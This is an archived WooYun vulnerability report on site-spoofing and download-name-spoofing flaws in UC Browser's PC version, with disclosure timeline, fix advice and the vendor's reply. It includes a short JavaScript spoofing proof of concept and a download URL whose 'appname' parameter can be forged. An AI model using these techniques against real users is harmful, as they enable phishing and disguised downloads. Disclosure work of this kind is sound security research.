{"id": 1302, "wybug_id": "wooyun-2014-065632", "wybug_title": "UC浏览器（PC版）任意网站伪造漏洞", "wybug_corp": "UC Mobile", "wybug_author": "我是小号", "wybug_date": "2014-06-20 17:46", "wybug_open_date": "2014-09-18 17:48", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当", "浏览器"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向公众公开  简要描述： UC浏览器任意网站伪造漏洞（打包） 详细说明：  浏览器版本\n\n#1.任意网站伪造POC:\n<script>function spoof(){document.write(\"<title>Baidu</title>\");document.write(\"<h1>I'm Fake One</h1><marquee>反正什么代码都可以</marquee><iframe src=http://www.baidu.com></iframe>\");window.location.assign(\"http://www.baidu.com:8100\");}setInterval(spoof(),2000);</script>\n运行POC以后会出错，但是UC浏览器很贴心的帮我们恢复了，结果就可以任意网站伪造了。\n\n#2.软件下载欺骗在用PC班UC浏览器装暴走漫画的应用时GET请求如下：\nhttp://down1.apps.uc.cn/group1/M00/B3/75/Cg2DP1OekvLT4GzOALNinX2P17I905.apk?attname=com.baozoumanhua.android_6.1.3_64.apk&appname=暴走漫画.apk\nappname=可控，可以任意伪造，没有确认，直接输出在了浏览器的下载框内。所以我们可以伪造暴走漫画的apk为十张内涵图，如下：\n\n当然其实下载下来的是暴走漫画啦   漏洞证明：  ~!1.\n\n~!2.\n\n   修复方案：  对于第二个，appname参数应该设置成用户不可控的，为什么要画蛇添足的设置一个appname参数呢？   版权声明：转载请注明来源 我是小号@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-06-20 22:13 厂商回复： 提到的第一个漏洞没有重现，UC浏览器没有自动修复，应该和使用的版本有关系；第二个漏洞存在，谢谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-11 09:34 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:84        | 三人行必有我师焉########################...)\t\t \n  第一个还是可以重现的，哈哈    \n     2014-07-11 16:24 |    \t\t爱Gail \t\t\t( 普通白帽子  |\t\t\t        Rank:237 漏洞数:38        | 爱漏洞、爱编程、爱旅游、爱Gail)\t\t \n  测试部的同学们加油啊    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}